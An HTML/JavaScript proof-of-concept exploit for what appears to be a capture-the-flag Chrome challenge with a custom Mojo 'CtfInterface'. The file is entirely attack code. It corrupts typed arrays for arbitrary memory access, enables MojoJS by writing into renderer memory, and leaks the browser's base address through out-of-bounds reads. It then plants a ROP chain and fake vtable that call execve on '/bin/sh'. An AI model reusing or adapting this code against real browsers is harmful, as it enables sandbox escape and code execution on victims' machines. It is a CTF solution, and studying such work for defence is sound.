<script src="mojo/mojo_bindings.js"></script>
<script src="mojo/./third_party/blink/public/mojom/CTF/ctf_interface.mojom.js"></script>

<script>

async function poc() {
if (typeof(Mojo) == "undefined") {
    var a32 = new Uint8Array([0xab, 0x59, 0x2c]);
    var l = 64
    var a = Array(l).fill(0xab);
    var b = new Uint8Array(a)
    var c = new ArrayBuffer(8);
    b.set(a32, l-1);

    function read(addr) {
        b[41] = Number(BigInt(addr) & 0xffffffffn);
        b[42] = Number(BigInt(addr) >> 32n);
        var d = new BigUint64Array(c);
        return Number(d[0]);
    }

    function write(addr, val) {
        b[41] = Number(BigInt(addr) & 0xffffffffn);
        b[42] = Number(BigInt(addr) >> 32n);
        var d = new BigUint64Array(c);
        d[0] = BigInt(val);
    }

    var mem_base = Number(BigInt(b[27]) << 32n);
    console.log(mem_base.toString(16));
    var v = read(mem_base + 0x40);
    var v = read(v);
    var g_frame_map = v + 0x88fd30;
    console.log('g_frame_map: 0x' + g_frame_map.toString(16));
    var v = read(g_frame_map + 0x8);
    console.log('v: 0x' + v.toString(16));
    var v = read(v + 0x28);
    console.log('v: 0x' + v.toString(16));
    var v = write(v + 0x444, 2)
    window.location.reload();
} else {

    async function ctfRead(ptr, off) {
        var ab = new ArrayBuffer(8);
        var a = new Float64Array(ab);
        var b = new BigUint64Array(ab);

        var val = await ptr.read(off).then(val  => { return val.value; });
        a[0] = val;
        return Number(b[0]);
    }

    async function ctfWrite(ptr, val, off) {

        var ab = new ArrayBuffer(8);
        var a = new Float64Array(ab);
        var b = new BigUint64Array(ab);
        b[0] = val;

        var ptr;
        var val = await ptr.write(a[0], off).then(val  => { return val.value; });
        return val;
    }

    console.log("Got Mojo!");

    // Create ctfPtr's until we can find our vector address
    var vec_base = 0;
    var vtable_off = 0;
    var sz = 4;
    var vtable = 0;
    while (vec_base == 0) {
        console.log("Looped");
        var ctfPtr1  = new blink.mojom.CtfInterfacePtr;
        var ctfReq1  = new mojo.makeRequest(ctfPtr1);
        Mojo.bindInterface(blink.mojom.CtfInterface.name, ctfReq1.handle);
        await ctfPtr1.resizeVector(sz);
        for (var i=0; i < 0x4; i++) {
           await ctfWrite(ctfPtr1, 0xcafebabedeadbeefn, i);
        }

        for (var i=0; i < 0x1000; i++) {
            var a = await ctfRead(ctfPtr1, i);
            // 0x4e0 == Vtable ptr lower bits
            if ((a & 0xfff) == 0x4e0) {
                var b = await ctfRead(ctfPtr1, i+1);
                var c = await ctfRead(ctfPtr1, i+2);
                if (c - b != 8*sz) { continue }
                console.log(a.toString(16));
                console.log(b.toString(16));
                console.log(c.toString(16));
                vtable = BigInt(a);
                vtable_off = i;
                vec_base = BigInt(b);
            }
        }
    }
    var chrome_base = vtable - 0xbc774e0n;

    console.log("chrome_base: 0x" + chrome_base.toString(16));
    console.log("vtable_off: 0x" + vtable_off);
    console.log("vec_base: 0x" + vec_base.toString(16));

    // Find some unused space for the vtable+ropchain
    var rop_base = (vec_base + 0x40000n) & 0xfffffffff0000n;
    var offset = Number((rop_base - vec_base) / 8n);
    var searching_space = true
    while (searching_space) {
        searching_space = false
        for (var i=0; i<0x20; i++) {
            var a = await ctfRead(ctfPtr1, offset+i);
            if (a != 0) {
                searching_space = true;
                offset += 0x20;
                rop_base += 0x100n;
                break
            }
        }
    }

    console.log("rop_base: 0x" + rop_base.toString(16));
    console.log("offset:   0x" + offset.toString(16));

    // pop rdi
    ctfWrite(ctfPtr1, chrome_base+0x37bb280n, offset+6);
    ctfWrite(ctfPtr1, rop_base+31n*8n, offset+7);
    // pop rsi
    ctfWrite(ctfPtr1, chrome_base+0x099b8ee0n, offset+8);
    ctfWrite(ctfPtr1, rop_base+29n*8n, offset+9);
    // pop rdx
    ctfWrite(ctfPtr1, chrome_base+0x3655332n, offset+10);
    ctfWrite(ctfPtr1, 0n, offset+11);
    // pop rax
    ctfWrite(ctfPtr1, chrome_base+0x3419404n, offset+12);
    ctfWrite(ctfPtr1, 0x3bn, offset+13);
    // syscall
    ctfWrite(ctfPtr1, chrome_base+0x33cab10n, offset+14);

    ctfWrite(ctfPtr1, rop_base+31n*8n, offset+29);
    ctfWrite(ctfPtr1, 0n, offset+30);
    ctfWrite(ctfPtr1, 0x68732f6e69622fn, offset+31);

    // Fake ctfPtr1's vtable
    // ctfWrite(ctfPtr1, vtable - 0x714e150n, offset+0);
    // add rsp, 0x20; pop rbp; ret;
    ctfWrite(ctfPtr1, chrome_base + 0x3d994e1n, offset+0);
    ctfWrite(ctfPtr1, vtable - 0x714e120n, offset+1);
    // ctfWrite(ctfPtr1, vtable - 0x714dff0n, offset+2);
    // xchg rax, rsp; ret;
    ctfWrite(ctfPtr1, chrome_base + 0x590510en, offset+2);
    ctfWrite(ctfPtr1, vtable - 0x714df90n, offset+3);
    ctfWrite(ctfPtr1, vtable - 0x714df50n, offset+4);

    // Actually overwrite the vtable
    ctfWrite(ctfPtr1, rop_base, vtable_off);

    // Trigger the rop
    ctfPtr1.resizeVector(0x1337);
}
}
poc();

</script>
